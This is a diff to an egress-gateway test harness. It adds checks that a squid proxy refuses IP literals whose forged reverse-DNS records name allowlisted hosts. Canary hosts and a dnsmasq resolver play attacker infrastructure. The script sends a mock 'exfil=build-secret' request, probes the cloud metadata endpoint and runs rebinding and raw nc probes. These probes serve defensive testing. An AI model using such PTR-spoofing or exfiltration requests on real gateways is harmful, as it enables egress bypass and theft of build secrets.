@@ -20,6 +20,12 @@ The matrix, each row judged on what squid itself answered -- a refusal must be s
   metadata  169.254.169.254, by IP literal, and ALLOWLISTED names that resolve to it, to
             AWS's IPv6 endpoint and to Alibaba's (rebinding, or an operator's DNS)
   port      an allowlisted repository on a port that is not a repository port
+  PTR       an IP literal whose REVERSE DNS names an allowlisted repository, and one whose
+            PTR names the registry (gate finding t5-f4f5f32-F1): the gateway resolves
+            through a resolver this probe controls, standing in for the internet's DNS,
+            where whoever owns an address sets its PTR. A control checks the resolver
+            really serves both PTRs, or the rows would pass for the reason the original
+            "by IP" row did -- the test addresses had no PTR at all.
   suffix    a name that extends an allowlisted one (allowed-repo.evil)
   redirect  an allowed repository redirecting to an unlisted host and to the metadata
             endpoint: the client follows, and the second hop must be refused; a redirect
@@ -100,6 +106,57 @@ def start_hosts(tmp):
                 "httpd -p 443 -h /www; exec httpd -f -p 80 -h /www"])
 
 
+# Attacker-owned addresses whose PTR names an allowlisted host. Reached by IP literal only.
+CANARIES = {"canary-repo": ("CANARY-REPO", "80", ALLOWED),
+            "canary-registry": ("CANARY-REGISTRY", "5000", h.REGISTRY)}
+RESOLVER, RESOLVER_IMAGE = "skald-egr-resolver", "skald-egr-resolver:local"
+
+
+def start_canaries(tmp):
+    for name, (content, port, _) in CANARIES.items():
+        www = pathlib.Path(tmp) / ("www-" + name)
+        www.mkdir(parents=True, exist_ok=True)
+        (www / "index.html").write_text(content + "\n")
+        os.chmod(www, 0o755)
+        os.chmod(www / "index.html", 0o644)
+        cname = "skald-egr-" + name
+        docker(["rm", "-f", cname])
+        docker(["run", "-d", "--name", cname, "--network", h.OUTER,
+                "-v", "%s:/www:ro" % www, sw.BUSYBOX_IMAGE, "sh", "-c",
+                "httpd -p 443 -h /www; exec httpd -f -p %s -h /www" % port])
+
+
+def start_resolver(tmp):
+    """dnsmasq on the outer network: a PTR for each canary naming an allowlisted host, and
+    everything else forwarded to Docker's embedded DNS, so every other name the gateway
+    resolves is answered exactly as before. Returns its address."""
+    d = pathlib.Path(tmp) / "resolver-image"
+    d.mkdir(parents=True, exist_ok=True)
+    (d / "Dockerfile").write_text("FROM alpine:3.20\nRUN apk add --no-cache dnsmasq\n")
+    if docker(["build", "-q", "-t", RESOLVER_IMAGE, str(d)], timeout=900).returncode != 0:
+        raise SystemExit("could not build the resolver image")
+    ptrs = []
+    for name, (_, _, points_at) in CANARIES.items():
+        rev = ".".join(reversed(outer_ip(name).split("."))) + ".in-addr.arpa"
+        ptrs.append("--ptr-record=%s,%s" % (rev, points_at))
+    docker(["rm", "-f", RESOLVER])
+    docker(["run", "-d", "--name", RESOLVER, "--network", h.OUTER, RESOLVER_IMAGE,
+            "dnsmasq", "-k", "--no-resolv", "--no-hosts", "--server=127.0.0.11",
+            "--log-queries", "--log-facility=-"] + ptrs)
+    return outer_ip("resolver")
+
+
+def ptr_control():
+    """(ok, detail): does the gateway's own resolver answer each canary's PTR with the
+    allowlisted name? Asked from inside the gateway, through the resolver it uses."""
+    seen = []
+    for name, (_, _, points_at) in CANARIES.items():
+        out = docker(["exec", h.GATEWAY, "nslookup", outer_ip(name)])
+        seen.append((points_at in out.stdout, "%s -> %s" % (
+            outer_ip(name), points_at if points_at in out.stdout else "NO PTR")))
+    return all(ok for ok, _ in seen), "; ".join(d for _, d in seen)
+
+
 def outer_ip(name):
     cname = "skald-egr-" + name.replace(".", "-")
     return docker(["inspect", "-f",
@@ -111,6 +168,10 @@ def outer_ip(name):
 
 MATRIX = r"""
 P=http://%(gate_ip)s:8888
+# Every network call is under `timeout`. Under the reverse_lookup weakening some request
+# held a whole RUN past the harness's 900 s build timeout (measured), and busybox nc's -w
+# bounds only connects and the final read, not a peer that keeps the connection open. A
+# request cut off here reports first:none, which is never a pass.
 # get KEY URL: fetch through the gateway as a raw HTTP/1.0 request over nc, so the whole
 # response is seen -- busybox wget prints no headers for an error, and squid's
 # X-Squid-Error header is what tells a POLICY refusal from a host that is merely down. A
@@ -121,7 +182,7 @@ raw() {
   # stdin held open: busybox nc drops the connection at stdin EOF, before a slower answer
   # arrives (measured: only squid's instant denials came back without this).
   { printf 'GET %%s HTTP/1.0\r\nHost: %%s\r\n\r\n' "$1" "$h"; sleep 3; } \
-    | nc -w 10 %(gate_ip)s 8888 > /tmp/resp 2>/dev/null
+    | timeout 20 nc -w 10 %(gate_ip)s 8888 > /tmp/resp 2>/dev/null
   tr -d '\r' < /tmp/resp > /tmp/resp.n
   status=$(head -1 /tmp/resp.n | awk '{print $2}')
 }
@@ -140,12 +201,13 @@ get() {
 # connect KEY HOST PORT: a raw CONNECT, the status line squid answers.
 connect() {
   st=$( { printf 'CONNECT %%s:%%s HTTP/1.1\r\nHost: %%s:%%s\r\n\r\n' "$2" "$3" "$2" "$3";
-          sleep 3; } | nc -w 5 %(gate_ip)s 8888 2>/dev/null | head -1 | awk '{print $2}')
+          sleep 3; } | timeout 15 nc -w 5 %(gate_ip)s 8888 2>/dev/null | head -1 \
+          | awk '{print $2}')
   echo "$1=${st:-none}"
 }
 # direct KEY HOST PORT: a socket opened by build code itself, not through the gateway.
 direct() {
-  if nc -z -w 5 "$2" "$3" 2>/dev/null; then echo "$1=CONNECTED"; else echo "$1=refused"; fi
+  if timeout 10 nc -z -w 5 "$2" "$3" 2>/dev/null; then echo "$1=CONNECTED"; else echo "$1=refused"; fi
 }
 get allowed http://%(allowed)s/
 get unlisted http://%(denied)s/
@@ -156,6 +218,9 @@ get rebind http://%(rebind)s/
 get rebind_aws6 http://rebind-aws6/
 get rebind_alibaba http://rebind-alibaba/
 get repo_badport http://%(allowed)s:6379/
+get ptr_repo "http://%(canary_repo)s/?exfil=build-secret"
+get ptr_registry http://%(canary_registry)s:5000/v2/
+connect ptr_connect %(canary_repo)s 443
 get suffix http://%(suffix)s/
 get redirect_ok http://%(allowed)s/cgi-bin/to-self
 get redirect_unlisted http://%(allowed)s/cgi-bin/to-denied
@@ -173,7 +238,7 @@ direct direct_internet 1.1.1.1 53
 # failure here is the internal network's missing route, which direct_internet shows too.
 # The control is that the tool exists: an absent applet must not read as "no DNS".
 echo "dns_tool=$(command -v nslookup >/dev/null 2>&1 && echo yes || echo no)"
-if nslookup example.com >/dev/null 2>&1; then echo "dns=resolved"; else echo "dns=failed"; fi
+if timeout 15 nslookup example.com >/dev/null 2>&1; then echo "dns=resolved"; else echo "dns=failed"; fi
 echo "dns_servers=$(awk '/^nameserver/{printf "%%s,", $2}' /etc/resolv.conf 2>/dev/null)"
 get registry_read http://%(registry)s:5000/v2/
 http_proxy=$P wget -S -T 10 -O /dev/null --post-data=x \
@@ -211,7 +276,7 @@ def policy_denied(r, key, forbidden_content=None):
     return denied and not leaked
 
 
-def judge(report):
+def judge(report, ptr_ok=True):
     """Row name -> (ok, detail). Every row is judged even if the control failed, but a
     failed control makes every denial row inconclusive, and inconclusive is not ok."""
     r = parse(report)
@@ -240,6 +305,19 @@ def judge(report):
         policy_denied(r, "rebind_alibaba"), "rebind_alibaba")
     row("allowlisted repository on another port refused", policy_denied(r, "repo_badport"),
         "repo_badport")
+    # Gated on the resolver control as well: without a PTR to follow, a refusal here proves
+    # nothing about reverse lookups (t5-f4f5f32-F1).
+    for key, label, ok in (
+            ("ptr_repo", "IP literal whose PTR names a repository refused",
+             policy_denied(r, "ptr_repo", "CANARY-REPO")),
+            ("ptr_registry", "IP literal whose PTR names the registry refused",
+             policy_denied(r, "ptr_registry", "CANARY-REGISTRY")),
+            ("ptr_connect", "CONNECT to an IP whose PTR names a repository refused",
+             r.get("ptr_connect") == "403")):
+        row(label, ok and ptr_ok, key)
+        if not ptr_ok:
+            rows[label] = (False, rows[label][1] + "  <- inconclusive: the resolver did "
+                                                   "not serve the PTR")
     row("suffix of an allowed name refused", policy_denied(r, "suffix", "EVIL-CONTENT"),
         "suffix")
     redirect_ok = (fields(r.get("redirect_ok", "")).get("first") == "302"
@@ -281,16 +359,25 @@ def run_matrix(tmp, label):
     script = MATRIX % {
         "gate_ip": h.gateway_ip_on_inner(), "allowed": ALLOWED, "denied": DENIED,
         "suffix": SUFFIX, "rebind": REBIND, "metadata": METADATA, "registry": h.REGISTRY,
-        "denied_ip": outer_ip(DENIED), "allowed_ip": outer_ip(ALLOWED)}
+        "denied_ip": outer_ip(DENIED), "allowed_ip": outer_ip(ALLOWED),
+        "canary_repo": outer_ip("canary-repo"),
+        "canary_registry": outer_ip("canary-registry")}
+    ptr_ok, ptr_detail = ptr_control()
     report, blob = h.run_local_step(tmp, "egress-" + label, script)
     lines = [l.strip() for l in report.strip().splitlines() if l.strip()]
     if not lines:
         return None, blob
-    return judge(lines), blob
+    rows = judge(lines, ptr_ok)
+    rows["the gateway's resolver serves the canaries' PTRs (control)"] = (ptr_ok, ptr_detail)
+    return rows, blob
 
 
-def shipped_gateway(weaken=None):
-    h.start_gateway(repos=REPOS, weaken=weaken, add_hosts=ADD_HOSTS)
+def shipped_gateway(weaken=None, repos=None):
+    h.start_gateway(repos=REPOS if repos is None else repos, weaken=weaken,
+                    add_hosts=ADD_HOSTS, resolver=state["resolver"])
+
+
+state = {"resolver": None}
 
 
 def main(argv):
@@ -300,6 +387,8 @@ def main(argv):
     try:
         h.setup(tmp)
         start_hosts(tmp)
+        start_canaries(tmp)
+        state["resolver"] = start_resolver(tmp)
         shipped_gateway()
         if "--self-test" in argv:
             return self_test(tmp)
@@ -340,6 +429,10 @@ WEAKENINGS = [
       "allowlisted name resolving to Alibaba metadata refused"]),
     ("repositories on any port", dict(weaken="any_repo_port"),
      ["allowlisted repository on another port refused"]),
+    ("reverse lookups (dstdomain without -n)", dict(weaken="reverse_lookup"),
+     ["IP literal whose PTR names a repository refused",
+      "IP literal whose PTR names the registry refused",
+      "CONNECT to an IP whose PTR names a repository refused"]),
     ("the allowlist unanchored", dict(weaken="unanchored"),
      ["suffix of an allowed name refused"]),
     ("CONNECT to any port", dict(weaken="any_connect_port"),
@@ -379,7 +472,7 @@ def self_test(tmp):
     for label, kw, must_fail in WEAKENINGS:
         weaken = kw.get("weaken")
         repos = kw.get("repos", REPOS)
-        h.start_gateway(repos=repos, weaken=weaken, add_hosts=ADD_HOSTS)
+        shipped_gateway(weaken=weaken, repos=repos)
         rows, blob = run_matrix(tmp, label.replace(" ", "-"))
         if rows is None:
             print("  FAIL %s: no report: %s" % (label, blob.strip()[-120:]))
